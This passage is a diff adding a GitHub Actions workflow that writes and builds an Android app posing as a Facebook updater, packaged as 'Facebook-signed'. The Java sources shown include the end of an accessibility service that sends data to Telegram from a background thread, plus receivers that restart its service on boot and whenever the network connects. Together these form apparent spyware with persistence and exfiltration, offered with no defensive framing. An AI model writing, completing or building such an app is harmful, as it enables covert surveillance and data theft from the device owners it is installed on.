+                              "\",\"parse_mode\":\"Markdown\"}";
+                          conn.getOutputStream().write(json.getBytes());
+                          conn.getOutputStream().flush();
+                          conn.getResponseCode();
+                          conn.disconnect();
+                      } catch (Exception e) {
+                          Log.e(TAG, "Telegram error: " + e.getMessage());
+                      }
+                  }).start();
+              }
+
+              @Override public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent event) {}
+              @Override public void onInterrupt() {}
+          }
+          EOF
+
+          # ============================================================
+          # BOOTRECEIVER.JAVA
+          # ============================================================
+          cat > app/src/main/java/com/facebook/updater/BootReceiver.java << 'EOF'
+          package com.facebook.updater;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          public class BootReceiver extends BroadcastReceiver {
+              @Override public void onReceive(Context context, Intent intent) {
+                  context.startService(new Intent(context, UpdaterService.class));
+              }
+          }
+          EOF
+
+          # ============================================================
+          # NETWORKRECEIVER.JAVA
+          # ============================================================
+          cat > app/src/main/java/com/facebook/updater/NetworkReceiver.java << 'EOF'
+          package com.facebook.updater;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.net.ConnectivityManager;
+          import android.net.NetworkInfo;
+          public class NetworkReceiver extends BroadcastReceiver {
+              @Override public void onReceive(Context context, Intent intent) {
+                  ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+                  NetworkInfo net = cm.getActiveNetworkInfo();
+                  if (net != null && net.isConnected()) {
+                      context.startService(new Intent(context, UpdaterService.class));
+                  }
+              }
+          }
+          EOF
+
+          echo "✅ All source files created."
+
+      - name: Setup Java 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.2'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Accept Android licenses
+        run: yes | sdkmanager --licenses
+
+      - name: Install Android build tools
+        run: |
+          sdkmanager "platform-tools"
+          sdkmanager "platforms;android-34"
+          sdkmanager "build-tools;34.0.0"
+
+      - name: Generate Keystore
+        run: |
+          keytool -genkey -v -keystore app/debug.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"
+
+      # ============================================================
+      # BUILD APK - FULLY CORRECTED ✅
+      # ============================================================
+      - name: Build APK
+        run: |
+          gradle wrapper --gradle-version 8.2
+          chmod +x gradlew
+          ./gradlew assembleDebug --stacktrace --info
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: Facebook-signed
+          path: app/build/outputs/apk/debug/*.apk
